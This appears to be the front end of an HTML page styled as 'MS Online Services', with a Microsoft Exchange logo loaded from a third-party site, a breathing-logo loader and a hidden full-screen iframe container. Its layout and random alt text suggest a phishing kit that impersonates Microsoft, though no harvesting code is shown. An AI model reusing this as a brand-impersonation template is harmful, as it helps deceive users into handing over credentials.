<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MS Online Services - Home</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body, html {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #333;
            overflow: hidden;
        }

        #loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.9);
            position: absolute;
            z-index: 1000;
            text-align: center;
        }

        .Breathing-logo {
            width: 110px;
            margin-bottom: 20px;
            animation: breathing 2s ease-in-out infinite;
        }

        /* Breathing animation */
        @keyframes breathing {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }

        .loader {
            width: 50px;
            padding: 8px;
            aspect-ratio: 1;
            border-radius: 50%;
            background: #87CEEB;
            --_m: 
                conic-gradient(#0000 10%,#000),
                linear-gradient(#000 0 0) content-box;
            -webkit-mask: var(--_m);
                    mask: var(--_m);
            -webkit-mask-composite: source-out;
                    mask-composite: subtract;
            animation: l3 1s infinite linear;
        }

        @keyframes l3 {
            to { transform: rotate(1turn); }
        }

        #main-content {
            width: 100%;
            height: 100%;
            display: none;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <div id="loader-container">
        <img src="https://seeklogo.com/images/M/microsoft-exchange-logo-9D5C1A540A-seeklogo.com.png" alt="vmuvx3l3klsout" class="Breathing-logo">
    </div>

    <div id="main-content"></div>
